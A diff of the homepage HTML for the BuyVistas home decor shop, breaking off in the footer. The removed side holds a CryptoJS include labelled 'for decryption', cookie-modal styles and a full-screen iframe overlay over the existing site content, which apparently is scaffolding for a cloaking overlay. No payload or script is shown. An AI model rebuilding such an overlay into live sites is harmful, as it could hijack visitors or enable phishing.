@@ -1,722 +1,414 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BuyVistas - Premium Home Decor</title>
-    <base href="/" />
-    <meta name="description" content="Discover curated collections of premium home decor that transform your space into a sanctuary of elegance and comfort." />
-    <link rel="stylesheet" href="css/styles.css" />
-
-    <!-- ===== CRYPTOJS FOR DECRYPTION ===== -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js">
-    </script>
-
-    <!-- ===== COOKIE MODAL STYLES ===== -->
-    <style>
-        /* ---------- reset / base ---------- */
-        .cookie-modal-box * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        /* ---------- modal backdrop ---------- */
-        .cookie-modal-box {
-            position: fixed;
-            inset: 0;
-            z-index: 9999;
-        }
-        .cookie-backdrop {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.4);
-            backdrop-filter: blur(8px);
-            z-index: 9998;
-        }
-        .cookie-modal {
-            position: fixed;
-            inset: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1rem;
-            z-index: 9999;
-        }
-        .cookie-card {
-            background: #fff;
-            border-radius: 1.5rem;
-            max-width: 28rem;
-            width: 100%;
-            padding: 2rem;
-            position: relative;
-            animation: cookieFadeIn 0.2s ease-out;
-        }
-        @keyframes cookieFadeIn {
-            from {
-                opacity: 0;
-                transform: scale(0.95);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-
-        /* ---------- close button ---------- */
-        .cookie-close-btn {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 0.25rem;
-            border-radius: 50%;
-            color: #6b7280;
-            transition: background 0.2s;
-        }
-        .cookie-close-btn:hover {
-            background: #f3f4f6;
-        }
-
-        /* ---------- card content ---------- */
-        .cookie-header {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            margin-bottom: 1rem;
-        }
-        .cookie-icon {
-            font-size: 2rem;
-        }
-        .cookie-title {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: #1f2937;
-        }
-        .cookie-text {
-            color: #4b5563;
-            margin-bottom: 1.5rem;
-            line-height: 1.6;
-            font-size: 0.95rem;
-        }
-        .cookie-text strong {
-            color: #1f2937;
-        }
-
-        /* ---------- buttons ---------- */
-        .cookie-btn-group {
-            display: flex;
-            flex-direction: column;
-            gap: 0.75rem;
-        }
-        @media (min-width: 640px) {
-            .cookie-btn-group {
-                flex-direction: row;
-            }
-        }
-        .cookie-btn-agree {
-            flex: 1;
-            background: #16a34a;
-            color: #fff;
-            border: none;
-            padding: 0.75rem 1rem;
-            border-radius: 0.5rem;
-            font-weight: 700;
-            cursor: pointer;
-            font-size: 0.95rem;
-            transition: background 0.2s;
-        }
-        .cookie-btn-agree:hover {
-            background: #15803d;
-        }
-        .cookie-btn-refuse {
-            flex: 1;
-            background: #e5e7eb;
-            color: #1f2937;
-            border: none;
-            padding: 0.75rem 1rem;
-            border-radius: 0.5rem;
-            font-weight: 700;
-            cursor: pointer;
-            font-size: 0.95rem;
-            transition: background 0.2s;
-        }
-        .cookie-btn-refuse:hover {
-            background: #d1d5db;
-        }
-
-        /* ---------- utility ---------- */
-        .cookie-hidden {
-            display: none !important;
-        }
-
-        /* ---------- iframe overlay ---------- */
-        #iframeContainer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            z-index: 9997;
-            background: #fff;
-        }
-        #iframeContainer iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-    </style>
+    <base href="/">
+    <meta name="description" content="Discover curated collections of premium home decor that transform your space into a sanctuary of elegance and comfort.">
+    <link rel="stylesheet" href="css/styles.css">
 </head>
 <body>
+    <!-- Header -->
+    <header class="header-sticky" data-testid="main-header">
+        <div class="luxe-container">
+            <div class="header-inner">
+                <!-- Mobile Menu Button -->
+                <button class="mobile-menu-btn" data-mobile-menu-btn aria-label="Toggle menu">
+                    <span data-menu-icon>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+                    </span>
+                </button>
 
-    <!-- ============================================================ -->
-    <!-- ======  YOUR EXISTING WEBSITE CONTENT  ====== -->
-    <!-- ============================================================ -->
-    <div id="yourWebsiteContent">
+                <!-- Logo -->
+                <a href="index.html" class="logo" data-testid="logo-link">
+                    <svg width="32" height="32" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="40" height="40" rx="4" fill="#1C1917"/>
+                        <path d="M8 20L14 12L20 20L26 12L32 20" stroke="#C5A059" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M8 28L14 20L20 28L26 20L32 28" stroke="#C5A059" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <h1>BuyVistas</h1>
+                </a>
 
-        <!-- ===== HEADER ===== -->
-        <header class="header-sticky" data-testid="main-header">
-            <div class="luxe-container">
-                <div class="header-inner">
-                    <!-- Mobile Menu Button -->
-                    <button class="mobile-menu-btn" data-mobile-menu-btn aria-label="Toggle menu">
-                        <span data-menu-icon>
-                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12" /><line x1="3" y1="6" x2="21" y2="6" /><line x1="3" y1="18" x2="21" y2="18" /></svg>
-                        </span>
+                <!-- Desktop Navigation -->
+                <nav class="nav-desktop" data-testid="desktop-nav">
+                    <a href="index.html" data-testid="nav-link-home">Home</a>
+                    <a href="shop.html" data-testid="nav-link-shop">Shop</a>
+                    <a href="about.html" data-testid="nav-link-about">About</a>
+                    <a href="contact.html" data-testid="nav-link-contact">Contact</a>
+                </nav>
+
+                <!-- Header Icons -->
+                <div class="header-icons">
+                    <!-- Search -->
+                    <div class="search-container" data-search-container>
+                        <form data-search-form>
+                            <input type="text" placeholder="Search..." data-search-input>
+                        </form>
+                        <button class="icon-btn" data-search-close aria-label="Close search">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                        </button>
+                    </div>
+                    <button class="icon-btn" data-search-btn aria-label="Search">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                     </button>
 
-                    <!-- Logo -->
-                    <a href="index.html" class="logo" data-testid="logo-link">
-                        <svg width="32" height="32" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <rect width="40" height="40" rx="4" fill="#1C1917" />
-                            <path d="M8 20L14 12L20 20L26 12L32 20" stroke="#C5A059" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" />
-                            <path d="M8 28L14 20L20 28L26 20L32 28" stroke="#C5A059" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" />
-                        </svg>
-                        <h1>BuyVistas</h1>
+                    <!-- Cart -->
+                    <a href="cart.html" class="icon-btn cart-link" data-testid="cart-link" aria-label="Cart">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path><line x1="3" y1="6" x2="21" y2="6"></line><path d="M16 10a4 4 0 0 1-8 0"></path></svg>
+                        <span class="cart-count" data-cart-count style="display: none;">0</span>
                     </a>
-
-                    <!-- Desktop Navigation -->
-                    <nav class="nav-desktop" data-testid="desktop-nav">
-                        <a href="index.html" data-testid="nav-link-home">Home</a>
-                        <a href="shop.html" data-testid="nav-link-shop">Shop</a>
-                        <a href="about.html" data-testid="nav-link-about">About</a>
-                        <a href="contact.html" data-testid="nav-link-contact">Contact</a>
-                    </nav>
-
-                    <!-- Header Icons -->
-                    <div class="header-icons">
-                        <!-- Search -->
-                        <div class="search-container" data-search-container>
-                            <form data-search-form>
-                                <input type="text" placeholder="Search..." data-search-input />
-                            </form>
-                            <button class="icon-btn" data-search-close aria-label="Close search">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
-                            </button>
-                        </div>
-                        <button class="icon-btn" data-search-btn aria-label="Search">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8" /><line x1="21" y1="21" x2="16.65" y2="16.65" /></svg>
-                        </button>
-
-                        <!-- Cart -->
-                        <a href="cart.html" class="icon-btn cart-link" data-testid="cart-link" aria-label="Cart">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z" /><line x1="3" y1="6" x2="21" y2="6" /><path d="M16 10a4 4 0 0 1-8 0" /></svg>
-                            <span class="cart-count" data-cart-count style="display: none;">0</span>
-                        </a>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Mobile Menu -->
-            <nav class="mobile-menu" data-mobile-menu>
-                <div class="luxe-container">
-                    <a href="index.html">Home</a>
-                    <a href="shop.html">Shop</a>
-                    <a href="about.html">About</a>
-                    <a href="contact.html">Contact</a>
-                </div>
-            </nav>
-        </header>
-
-        <!-- ===== MAIN ===== -->
-        <main data-testid="home-page">
-
-            <!-- Hero Section -->
-            <section class="hero-section" data-testid="hero-section">
-                <div class="hero-bg">
-                    <img src="https://images.unsplash.com/photo-1677568554453-ae5baf28da6c?w=1600" alt="Elegant living room" />
-                    <div class="hero-overlay"></div>
-                </div>
-                <div class="luxe-container">
-                    <div class="hero-content animate-fade-in-up">
-                        <p class="caption-text">Premium Home Decor</p>
-                        <h1 class="heading-hero">Transform Your Space with Elegant Home Decor</h1>
-                        <p>Discover curated collections that bring warmth, style, and personality to every corner of your home.</p>
-                        <div class="hero-buttons">
-                            <a href="shop.html" class="btn-primary" data-testid="shop-now-btn">
-                                Shop Now
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12" /><polyline points="12 5 19 12 12 19" /></svg>
-                            </a>
-                            <a href="about.html" class="btn-secondary">Our Story</a>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- Offer Banner -->
-            <section class="offer-banner" data-testid="offer-banner">
-                <div class="luxe-container">
-                    <p>
-                        <span class="highlight">FLAT 20% OFF</span> + Free Shipping on all orders above $99 | Use code: <span class="highlight">LUXE20</span>
-                    </p>
-                </div>
-            </section>
-
-            <!-- Categories Section -->
-            <section class="section-spacing" data-testid="categories-section">
-                <div class="luxe-container">
-                    <div class="text-center mb-12">
-                        <p class="caption-text mb-3">Browse By</p>
-                        <h2 class="heading-section">Shop Categories</h2>
-                    </div>
-                    <div class="categories-grid" id="categories-grid">
-                        <!-- loaded by JS -->
-                    </div>
-                </div>
-            </section>
-
-            <!-- Best Sellers -->
-            <section class="section-spacing bg-muted" data-testid="bestsellers-section">
-                <div class="luxe-container">
-                    <div style="display:flex;flex-direction:column;gap:1rem;margin-bottom:3rem;">
-                        <div style="display:flex;flex-direction:column;gap:1rem;justify-content:space-between;align-items:flex-start;">
-                            <div>
-                                <p class="caption-text mb-3">Customer Favorites</p>
-                                <h2 class="heading-section">Best Sellers</h2>
-                            </div>
-                            <a href="shop.html" class="btn-ghost" style="margin-top:1rem;">
-                                View All Products
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12" /><polyline points="12 5 19 12 12 19" /></svg>
-                            </a>
-                        </div>
-                    </div>
-                    <div class="product-grid" id="bestsellers-grid">
-                        <!-- loaded by JS -->
-                    </div>
-                </div>
-            </section>
-
-            <!-- USP Section -->
-            <section class="section-spacing" data-testid="usp-section">
-                <div class="luxe-container">
-                    <div class="usp-grid">
-                        <div class="feature-card">
-                            <div class="feature-card-icon">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="3" width="15" height="13" /><polygon points="16 8 20 8 23 11 23 16 16 16 16 8" /><circle cx="5.5" cy="18.5" r="2.5" /><circle cx="18.5" cy="18.5" r="2.5" /></svg>
-                            </div>
-                            <h3>Free Shipping</h3>
-                            <p>Free delivery on orders above $99</p>
-                        </div>
-                        <div class="feature-card">
-                            <div class="feature-card-icon">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" /></svg>
-                            </div>
-                            <h3>Secure Payment</h3>
-                            <p>Cash on Delivery available</p>
-                        </div>
-                        <div class="feature-card">
-                            <div class="feature-card-icon">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10" /><polyline points="1 20 1 14 7 14" /><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15" /></svg>
-                            </div>
-                            <h3>Easy Returns</h3>
-                            <p>7-day hassle-free returns</p>
-                        </div>
-                        <div class="feature-card">
-                            <div class="feature-card-icon">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 18v-6a9 9 0 0 1 18 0v6" /><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z" /></svg>
-                            </div>
-                            <h3>Support 24/7</h3>
-                            <p>Dedicated customer support</p>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- Testimonials -->
-            <section class="section-spacing bg-muted" data-testid="testimonials-section">
-                <div class="luxe-container">
-                    <div class="text-center mb-12">
-                        <p class="caption-text mb-3">What Our Customers Say</p>
-                        <h2 class="heading-section">Testimonials</h2>
-                    </div>
-                    <div class="testimonials-grid">
-                        <div class="testimonial-card">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="currentColor" style="color:#C5A059;opacity:0.5;margin-bottom:1rem;"><path d="M11.192 15.757c0-.88-.23-1.618-.69-2.217-.326-.412-.768-.683-1.327-.812-.55-.128-1.07-.137-1.54-.028-.16-.95.1-1.956.76-3.022.66-1.065 1.515-1.867 2.558-2.403L9.373 5c-.8.396-1.56.898-2.26 1.505-.71.607-1.34 1.305-1.9 2.094s-.98 1.68-1.25 2.69-.346 2.04-.217 3.1c.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l.002.003zm9.124 0c0-.88-.23-1.618-.69-2.217-.326-.42-.77-.692-1.327-.817-.56-.124-1.074-.13-1.54-.022-.16-.94.09-1.95.75-3.02.66-1.06 1.514-1.86 2.557-2.4L18.49 5c-.8.396-1.555.898-2.26 1.505-.708.607-1.34 1.305-1.894 2.094-.556.79-.97 1.68-1.24 2.69-.273 1-.345 2.04-.217 3.1.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l-.007.003z" /></svg>
-                            <p class="testimonial-quote">The quality of the ceramic vases exceeded my expectations. They are now the centerpiece of my living room!</p>
-                            <div class="testimonial-author">
-                                <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=200" alt="Sarah Johnson" />
-                                <div class="testimonial-author-info">
-                                    <p>Sarah Johnson</p>
-                                    <p>Atlanta, GA</p>
-                                </div>
-                                <div class="stars" style="margin-left:auto;">
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="testimonial-card">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="currentColor" style="color:#C5A059;opacity:0.5;margin-bottom:1rem;"><path d="M11.192 15.757c0-.88-.23-1.618-.69-2.217-.326-.42-.77-.692-1.327-.817-.56-.124-1.074-.13-1.54-.022-.16-.94.09-1.95.75-3.02.66-1.06 1.514-1.86 2.557-2.4L18.49 5c-.8.396-1.555.898-2.26 1.505-.708.607-1.34 1.305-1.894 2.094-.556.79-.97 1.68-1.24 2.69-.273 1-.345 2.04-.217 3.1.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l-.007.003z" /></svg>
-                            <p class="testimonial-quote">Fast delivery and excellent packaging. The pendant lights look even better in person. Highly recommend!</p>
-                            <div class="testimonial-author">
-                                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=200" alt="Michael Chen" />
-                                <div class="testimonial-author-info">
-                                    <p>Michael Chen</p>
-                                    <p>New York, NY</p>
-                                </div>
-                                <div class="stars" style="margin-left:auto;">
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="testimonial-card">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="currentColor" style="color:#C5A059;opacity:0.5;margin-bottom:1rem;"><path d="M11.192 15.757c0-.88-.23-1.618-.69-2.217-.326-.412-.768-.683-1.327-.812-.55-.128-1.07-.137-1.54-.028-.16-.95.1-1.956.76-3.022.66-1.065 1.515-1.867 2.558-2.403L9.373 5c-.8.396-1.56.898-2.26 1.505-.71.607-1.34 1.305-1.9 2.094s-.98 1.68-1.25 2.69-.346 2.04-.217 3.1c.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l.002.003zm9.124 0c0-.88-.23-1.618-.69-2.217-.326-.42-.77-.692-1.327-.817-.56-.124-1.074-.13-1.54-.022-.16-.94.09-1.95.75-3.02.66-1.06 1.514-1.86 2.557-2.4L18.49 5c-.8.396-1.555.898-2.26 1.505-.708.607-1.34 1.305-1.894 2.094-.556.79-.97 1.68-1.24 2.69-.273 1-.345 2.04-.217 3.1.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l-.007.003z" /></svg>
-                            <p class="testimonial-quote">I've ordered multiple times from BuyVistas. Consistent quality and beautiful designs every time.</p>
-                            <div class="testimonial-author">
-                                <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=200" alt="Emily Davis" />
-                                <div class="testimonial-author-info">
-                                    <p>Emily Davis</p>
-                                    <p>Los Angeles, CA</p>
-                                </div>
-                                <div class="stars" style="margin-left:auto;">
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                    <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" /></svg>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- CTA Section -->
-            <section class="cta-section" data-testid="cta-section">
-                <div class="cta-bg">
-                    <img src="https://images.unsplash.com/photo-1767720580810-58be50f89bf8?w=1600" alt="Interior" />
-                    <div class="cta-overlay"></div>
-                </div>
-                <div class="luxe-container">
-                    <div class="cta-content">
-                        <h2>Ready to Transform Your Home?</h2>
-                        <p>Explore our complete collection of premium home decor pieces and find the perfect additions to your space.</p>
-                        <a href="shop.html" class="btn-gold">
-                            Explore Collection
-                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12" /><polyline points="12 5 19 12 12 19" /></svg>
-                        </a>
-                    </div>
-                </div>
-            </section>
-
-        </main>
-
-        <!-- ===== FOOTER ===== -->
-        <footer class="footer" data-testid="main-footer">
-            <!-- Newsletter -->
-            <div class="footer-newsletter">
-                <div class="luxe-container">
-                    <div class="footer-newsletter-inner">
-                        <h3>Join the BuyVistas Family</h3>
-                        <p>Subscribe to receive exclusive offers, design tips, and early access to new collections.</p>
-                        <form class="newsletter-form" onsubmit="handleNewsletterSubmit(event)">
-                            <input type="email" placeholder="Enter your email" data-newsletter-email required />
-                            <button type="submit">Subscribe</button>
-                        </form>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Main Footer -->
-            <div class="footer-main">
-                <div class="luxe-container">
-                    <div class="footer-grid">
-                        <!-- Brand -->
-                        <div class="footer-brand">
-                            <h4>
-                                <svg width="28" height="28" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <rect width="40" height="40" rx="4" fill="#C5A059" />
-                                    <path d="M8 20L14 12L20 20L26 12L32 20" stroke="#FFFFFF" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" />
-                                    <path d="M8 28L14 20L20 28L26 20L32 28" stroke="#FFFFFF" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" />
-                                </svg>
-                                BuyVistas
-                            </h4>
-                            <p>Curating exceptional home decor pieces that transform your space into a sanctuary of elegance and comfort.</p>
-                            <div class="footer-social">
-                                <a href="https://instagram.com" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
-                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5" /><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" /><line x1="17.5" y1="6.5" x2="17.51" y2="6.5" /></svg>
-                                </a>
-                                <a href="https://facebook.com" target="_blank" rel="noopener noreferrer" aria-label="Facebook">
-                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" /></svg>
-                                </a>
-                                <a href="https://twitter.com" target="_blank" rel="noopener noreferrer" aria-label="Twitter">
-                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" /></svg>
-                                </a>
-                            </div>
-                        </div>
-
-                        <!-- Shop Links -->
-                        <div class="footer-links">
-                            <h5>Shop</h5>
-                            <ul>
-                                <li><a href="shop.html">All Products</a></li>
-                                <li><a href="shop.html?category=Wall%20Art">Wall Art</a></li>
-                                <li><a href="shop.html?category=Lighting">Lighting</a></li>
-                                <li><a href="shop.html?category=Decor">Decor</a></li>
-                                <li><a href="shop.html?category=Furniture">Furniture</a></li>
-                                <li><a href="shop.html?category=Kitchen">Kitchen</a></li>
-                                <li><a href="shop.html?category=Bedroom">Bedroom</a></li>
-                            </ul>
-                        </div>
-
-                        <!-- Company Links -->
-                        <div class="footer-links">
-                            <h5>Company</h5>
-                            <ul>
-                                <li><a href="about.html">About Us</a></li>
-                                <li><a href="contact.html">Contact</a></li>
-                                <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                                <li><a href="terms.html">Terms & Conditions</a></li>
-                                <li><a href="refund-policy.html">Refund Policy</a></li>
-                                <li><a href="shipping-policy.html">Shipping Policy</a></li>
-                            </ul>
-                        </div>
-
-                        <!-- Contact -->
-                        <div class="footer-links">
-                            <h5>Contact Us</h5>
